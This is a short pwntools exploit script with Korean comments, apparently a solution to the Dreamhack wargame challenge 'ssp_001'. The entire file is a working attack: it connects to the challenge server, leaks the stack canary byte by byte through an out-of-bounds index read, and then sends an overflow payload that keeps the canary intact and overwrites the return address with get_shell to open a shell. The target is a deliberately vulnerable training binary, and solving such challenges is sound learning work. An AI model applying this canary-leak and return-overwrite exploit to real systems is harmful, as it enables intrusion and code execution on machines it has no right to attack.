from pwn import *

context.arch = 'i386'

p = remote('host3.dreamhack.games', 24260)
#p = process('./ssp_001')
e = ELF('./ssp_001')

get_shell = e.symbols['get_shell']

canary = b''

i = 131
for _ in range(4):
    p.sendafter('> ', 'P')
    p.sendlineafter('Element index : ',str(i)) #입력을 줄때 str형식인걸 생각하면 i를 str타입으로 줘야함
    p.recvuntil('is : ')
    canary += p.recvn(2)
    i -= 1

print(canary)
canary = int(canary,16) #p32를 하기위해서 int를 취해줌 그리고 주소니까 16진수인거 알지?


payload = b'a'*0x40 + p32(canary) + b'a'*0x8 + p32(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()
